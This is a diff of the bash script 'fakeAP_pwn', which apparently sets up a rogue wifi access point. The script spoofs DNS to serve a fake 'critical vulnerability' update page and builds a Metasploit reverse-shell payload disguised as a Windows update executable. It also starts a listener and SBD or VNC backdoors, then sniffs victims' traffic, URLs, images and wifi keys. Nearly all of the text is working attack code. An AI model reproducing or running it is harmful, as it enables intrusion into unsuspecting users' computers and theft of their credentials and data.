-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing up $wifiInterface" -e "$command"
 command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
 if [ -n "$command" ] ; then
    command="kill $command"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing everything on the interface " -e "$command" # to prevent interference
+   action "Killing programs which are using $wifiInterface" "$command" $verbose $diagnostics "true" $debug # to prevent interference
 fi
 if [ "$apType" == "airbase-ng" ] ; then
    command="airmon-ng start $wifiInterface"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Starting)" -e "$command"
-      sleep 1
-      ifconfig mon0 mtu $mtu                                                             # Changes MTU for FakeAP
+   action "Monitor Mode (Starting)" "$command" $verbose $diagnostics "true" $debug
+   sleep 1
+   ifconfig mon0 mtu $mtu                                                             # Changes MTU for FakeAP
+   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+   if [ "$command" != "$monitorInterface" ] ; then
+      sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
       command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
-      if [ "$command" != "$monitorInterface" ] ; then
-         sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
-         command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
       if [ "$command" != "$monitorInterface" ] ; then
          echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isn't correct." 1>&2
       if [ "$debug" == "true" ] ; then iwconfig; fi
@@ -663,11 +694,11 @@ fi
 if [ "$apType" == "airbase-ng" ] ; then
    command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
    if [ $command ]; then # $interface is WiFi. Therefore two WiFi cards...
-      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;32m[>]\e[00m Testing injection..."; fi
+      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;34m[>]\e[00m Testing injection..."; fi
       command=$(aireplay-ng --test $monitorInterface) #-i ???
-      if [ `echo $command | grep "Found 0 APs"` ] ; then echo -e "\e[00;31m[-]\e[00m Couldn't test packet injection" 1>&2;
-      elif ! [ `echo $command | egrep "Injection is working"` ] ; then
-         echo -e "\e[00;31m[-]\e[00m The $monitorInterface, doesn't support packet injecting." 1>&2
+      if [ $(echo '$command' | grep "Found 0 APs") ] ; then echo -e "\e[00;31m[-]\e[00m Couldn't test packet injection" 1>&2;
+      elif [ ! $(echo '$command' | grep "Injection is working") ] ; then
+         echo -e "\e[00;31m[-]\e[00m $monitorInterface doesn't support packet injecting." 1>&2
          #cleanup
       fi
    fi
@@ -676,13 +707,12 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ "$apType" == "airbase-ng" ] ; then
    if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
-      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."; fi
+      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;32m[>]\e[00m Changing MAC address..."; fi
       command="ifconfig $monitorInterface down &&"
       if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $monitorInterface"; fi
       if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $monitorInterface"; fi
       command="$command && ifconfig $monitorInterface up"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "$command" &
+      action "Changing MAC Address of FakeAP" "$command" $verbose $diagnostics "true" $debug
       sleep 2
    fi
    if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
@@ -1144,10 +1174,9 @@ if [ "$apMode" != "normal" ] ; then
    if [ -e $www/Windows-KB183905-x86-ENU.exe ]; then rm $www/Windows-KB183905-x86-ENU.exe; fi
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
+   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
    command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
-   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command"
+   action "Metasploit (Windows)" "$command" $verbose $diagnostics "true" $debug
    if [ ! -e $www/Windows-KB183905-x86-ENU.exe ] ; then echo -e "\e[00;31m[-]\e[00m Failed to created exploit." 1>&2; cleanup; fi
 fi
 
@@ -1168,8 +1197,8 @@ if [ "$apType" == "airbase-ng" ] ; then
       if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
       if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then command="$command -v"; fi
       command="$command $monitorInterface"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$command" &
+      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
+      action "Fake Access Point" "$command" $verbose $diagnostics "true" $debug 10 0 4& # Dont wait, do the next command
       sleep 3
       ifconfig at0 up                                       # The new FakeAP interface
 #if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
@@ -1181,11 +1210,11 @@ if [ "$apType" == "airbase-ng" ] ; then
          if [ "$apMode" != "non" ] ; then loopMain="True"; break; fi                 # Not using $interface therefore can't test.
          command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
          if [ ! $command ]; then loopMain="True"; break; fi                          # $interface isnt WiFi, therefore can't test.
-         echo -e "\e[01;33m[i]\e[00m Attempt #$i to detect the fake access point."
+         echo -e "\e[01;34m[i]\e[00m Attempt #$i to detect the fake access point."
          loopSub="False"
          x="1"
          for x in {1..5} ; do # Sub loop
-            echo -e "\e[01;33m[i]\e[00m Try #$x scanning for the fake access point."
+            echo -e "\e[01;34m[i]\e[00m Scanning access point (Scan #$x)"
             testAP $ESSID $interface
             return_val=$?
             if [ "$return_val" -eq "0" ] ; then loopSub="True"; break; # Sub loop
@@ -1195,7 +1224,7 @@ if [ "$apType" == "airbase-ng" ] ; then
             else echo -e "\e[00;31m[-]\e[00m Unknown error."; fi
          done # Sub loop
          if [ $loopSub == "True" ] ; then
-            echo -e "\e[01;33m[i]\e[00m Detected the fake access point."
+            echo -e "\e[01;33m[i]\e[00m Detected the fake access point! ($ESSID)"
             loopMain="True"
             break; # Main Loop
          fi
@@ -1203,7 +1232,7 @@ if [ "$apType" == "airbase-ng" ] ; then
 # Ping test? Make sure its working working...
       if [ -z "$(pgrep airbase-ng)" ] ; then
          echo -e "\e[00;31m[-]\e[00m airbase-ng failed to start." 1>&2
-         if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
+         if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi;
          cleanup
       fi
    sleep 3
@@ -1214,12 +1243,11 @@ if [ "$apType" == "airbase-ng" ] ; then
    fi
 elif [ "$apType" == "hostapd" ] ; then
    command="hostapd /tmp/fakeAP_pwn.hostapd"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$command" &
+   action "Fake Access Point" "$command" $verbose $diagnostics "true" $debug 10 0 4 & # Dont wait, do the next command
    sleep 3
    if [ -z "$(pgrep hostapd)" ] ; then
       echo -e "\e[00;31m[-]\e[00m hostapd failed to start." 1>&2
-      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
+      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
       cleanup
    fi
 fi
@@ -1227,11 +1255,9 @@ fi
 
 if [ "$diagnostics" == "true" ] ; then
    sleep 5
-   echo "*Testing AP******************************" >> fakeAP_pwn.output
    echo -e "\e[01;34m[i]\e[00m ping -I $apInterface -c 4 10.0.0.1"
-   ping -I $apInterface -c 4 10.0.0.1 >> fakeAP_pwn.output
-
-   echo "*Commands********************************" >> fakeAP_pwn.output
+   echo "-Testing Acess point-------------------------------------------------------------------------
+$(ping -I $apInterface -c 4 10.0.0.1)" >> fakeAP_pwn.log
 fi
 
 #----------------------------------------------------------------------------------------------#
@@ -1266,11 +1292,9 @@ fi
 
 # DHCP
 command="chmod 775 /var/run/"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "$command"
+action "DHCP" "$command" $verbose $diagnostics "true" $debug
 command="touch /var/lib/dhcp3/dhcpd.leases"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "$command"
+action "DHCP" "$command" $verbose $diagnostics "true" $debug
 if [ -e /etc/apparmor.d/usr.sbin.dhcpd3 ] ; then # ubuntu - Fixes folder persmissions
    if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]       ; then rm /etc/apparmor.d/usr.sbin.dhcpd3.bkup; fi
    if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn ] ; then rm /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn; fi
@@ -1284,24 +1308,22 @@ fi
 # ubuntu - PID need
 
 #----------------------------------------------------------------------------------------------#
-echo -e "\e[01;32m[>]\e[00m Starting: DHCP server"
+echo -e "\e[01;32m[>]\e[00m Starting: DHCP"
 command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" # -d = logging, -f = forground
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x5+10+75 -T "fakeAP_pwn v$version - DHCP server" -e "$command" &
+action "DHCP" "$command" $verbose $diagnostics "true" $debug 10 75 5 & # Dont wait, do the next command
 sleep 2
 if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
    echo -e "\e[00;31m[-]\e[00m DHCP server failed to start." 1>&2
-   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
+   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
    cleanup
 fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$apMode" != "normal" ] ; then
-   echo -e "\e[01;32m[>]\e[00m Starting: DNS services"
+   echo -e "\e[01;32m[>]\e[00m Starting: DNS"
    #command=$(/opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns) #metasploit
    command="dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns"                   #dnsspoof
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x5+10+165 -T "fakeAP_pwn v$version - DNS" -e "$command" &
+   action "DNS" "$command" $verbose $diagnostics "true" $debug 10 165 5 & # Dont wait, do the next command
    sleep 2
 
 #----------------------------------------------------------------------------------------------#
@@ -1313,12 +1335,11 @@ if [ "$apMode" != "normal" ] ; then
    command=$(netstat -l -t -p | grep 4565)
    if [ "$command" != "" ] ; then echo -e "\e[00;31m[-]\e[00m The port (4564) isn't free." 1>&2; cleanup; fi # Kill it for them?
    command="/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" #ExitOnSession=false
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x15+10+255 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command" &
+   action "Metasploit (Windows)" "$command" $verbose $diagnostics "true" $debug 10 255 15 & # Dont wait, do the next command
    sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download...
    if [ -z "$(pgrep ruby)" ] ; then
       echo -e "\e[00;31m[-]\e[00m Metaspliot failed to start." 1>&2
-      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
+      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
       cleanup
    fi
 
@@ -1332,42 +1353,38 @@ if [ "$apMode" != "normal" ] ; then
       mv server.pem /etc/ssl/certs/ssl-cert-snakeoil.pem
    fi
    command="/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" #dissable all sites and only enable the fakeAP_pwn one
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "$command" &
+   action "Web Sever" "$command" $verbose $diagnostics "true" $debug & # Dont wait, do the next command
    sleep 2
    if [ -z "$(pgrep apache2)" ] ; then
       echo -e "\e[00;31m[-]\e[00m Apache2 failed to start." 1>&2
-      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
+      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
       cleanup
    fi
 
 if [ "$diagnostics" == "true" ] ; then
     sleep 3
-    echo "*Testing Web server**********************" >> fakeAP_pwn.output
+    echo -e "\e[01;34m[i]\e[00m Testing: Web server"
+    echo "-Testing Web server--------------------------------------------------------------------------" >> fakeAP_pwn.log
     command=$(wget -qO- 10.0.0.1 | grep "<h2>There has been a <u>critical vulnerability</u> discovered in your operating system</h2>")
     if [ "$command" != "" ] ; then
-        echo "*Web server is running correctly*" >> fakeAP_pwn.output
-        echo -e "\e[01;34m[i]\e[00m Web server: Okay"
+        echo "-->Web server: Okay" >> fakeAP_pwn.log
     else
-        echo "***Web server ISN'T running correctly***" >> fakeAP_pwn.output
-        echo "-->Output" >> fakeAP_pwn.output
-        wget -qO- 10.0.0.1 >> fakeAP_pwn.output
-        echo -e "\e[01;34m[i]\e[00m Web server: Failed" 1>&2;
+       echo -e "\e[01;31m[i]\e[00m Web server: Failed" 1>&2;
+        echo "-->Web server: Failed" >> fakeAP_pwn.log
+        echo "Output:" >> fakeAP_pwn.log
+        wget -qO- http://10.0.0.1 >> fakeAP_pwn.log
     fi
-    echo "*Commands********************************" >> fakeAP_pwn.output
 fi
 
 #----------------------------------------------------------------------------------------------#
    if [ "$payload" == "vnc" ] ; then
       echo -e "\e[01;32m[>]\e[00m Getting the backdoor (VNC) ready..."
       command="vncviewer -listen"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - VNC" -e "$command" &
+      action "VNC" "$command" $verbose $diagnostics "true" $debug 10 440 22 & # Dont wait, do the next command
    elif [ "$payload" == "sbd" ] ; then
       echo -e "\e[01;32m[>]\e[00m Getting the backdoor (SBD) ready..."
       command="sbd -l -k g0tmi1k -p $port"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - SBD" -e "$command" &
+      action "SBD" "$command" $verbose $diagnostics "true" $debug 10 440 22 & # Dont wait, do the next command
       sleep 1
    fi
 
@@ -1389,8 +1406,7 @@ fi
    # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
    if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
       command="watch -d -n 1 \"arp -n -v -i $apInterface\""
-      if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi ; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x5+10+475 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
+      action "Connections" "$command" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
    fi
    echo -e "\e[01;33m[*]\e[00m Waiting for target to run the \"update\""
    if [ -e /tmp/fakeAP_pwn.lock ] ; then rm -r /tmp/fakeAP_pwn.lock; fi
@@ -1400,9 +1416,9 @@ fi
 
 #----------------------------------------------------------------------------------------------#
    echo -e "\e[01;33m[+]\e[00m Target infected!"
-   if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> fakeAP_pwn.output; fi
+   if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> fakeAP_pwn.log; fi
    targetIP=$(arp -n -v -i at0 | awk '/at0/' | awk -F " " '{print $1}')
-   if [ "$verbose" != "0" ] ; then echo -e "\e[01;33m[i]\e[00m Target's IP = $targetIP"; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> fakeAP_pwn.output; fi
+   if [ "$verbose" != "0" ] ; then echo -e "\e[01;33m[i]\e[00m Target's IP = $targetIP"; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> fakeAP_pwn.log; fi
 
 #----------------------------------------------------------------------------------------------#
    if [ "$apMode" == "transparent" ] ; then
@@ -1425,47 +1441,48 @@ fi
 #----------------------------------------------------------------------------------------------#
    if [ "$payload" == "wkv" ] ; then
       echo -e "\e[01;32m[>]\e[00m Opening WiFi Keys..."
-      xterm -hold -geometry 130x22+10+440 -T "fakeAP_pwn v$version - WiFi Keys" -e "cat /tmp/fakeAP_pwn.wkv" & # Don't close! We want to view this!
+      action "WiFi Keys" "cat /tmp/fakeAP_pwn.wkv" "false" "false" "false" "true" 10 440 22 & # Don't close! We want to view this!
       sleep 1
+   fi
+#----------------------------------------------------------------------------------------------#
+elif [ "$apMode" == "normal" ] ; then
+   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
+      command="watch -d -n 1 \"arp -n -v -i $apInterface\""
+      action "Connections" "$command" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
    fi
 fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$extras" == "true" ] ; then
    echo -e "\e[01;32m[>]\e[00m Caputuring infomation about the target..."
-   command="tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 100x10+650+640 -T "fakeAP_pwn v$version - tcpdump" -e "$command" &       # Dump all trafic into a file
-   command="urlsnarf -i $apInterface"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x10+10+0    -T "fakeAP_pwn v$version - URLs" -e "$command" &           # URLs
+   command="tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" # Dump all trafic into a file
+   action "tcpdump" "$command" $verbose $diagnostics "true" $debug 650 640 10& # Dont wait, do the next command
+   command="urlsnarf -i $apInterface" # URLs
+   action "URLs" "$command" $verbose $diagnostics "true" $debug 10 0 10& # Dont wait, do the next command
    command="driftnet -i $apInterface"
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x10+10+465  -T "fakeAP_pwn v$version - Images" -e "$command" &         # Images
+   action "Images" "$command" $verbose $diagnostics "true" $debug 10 465 10 & # Dont wait, do the next command
    #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    #command="sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
    #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "$command" &            # SSLStrip
    #command="dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
    #$xterm -geometry 75x10+10+155  -T "fakeAP_pwn v$version - Passwords" -e "$command" &     # Passwords
    #command="ettercap -T -q -p -i $apInterface // //"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
    #$xterm -geometry 75x10+460+155 -T "fakeAP_pwn v$version - Passwords (2)" -e "$command" & # Passwords (again)
    #command="msgsnarf -i $apInterface"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
    #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM" -e "$command" &            # IM
    #command="imsniff $apInterface"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
    #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM (2)" -e "$command" &        # IM (again)
+fi
+
 #----------------------------------------------------------------------------------------------#
-elif [ "$apMode" == "normal" ] ; then
-   if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
-      command="watch -d -n 1 \"arp -n -v -i $apInterface\""
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x5+10+475 -T "fakeAP_pwn v$version - Connect Users" -e "$command" &
-   fi
+if [ "$apMode" == "normal" ] ; then
    echo -e "\e[01;33m[*]\e[00m Ready! ...press CTRL+C to stop"
+   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> fakeAP_pwn.log; fi
    for (( ; ; ))
    do
       sleep 1
@@ -1473,5 +1490,5 @@ elif [ "$apMode" == "normal" ] ; then
 fi
 
 #----------------------------------------------------------------------------------------------#
-if [ "$diagnostics" == "true" ] ; then echo "-Done!-----------------------------------" >> fakeAP_pwn.output; fi
+if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> fakeAP_pwn.log fi
 cleanup clean
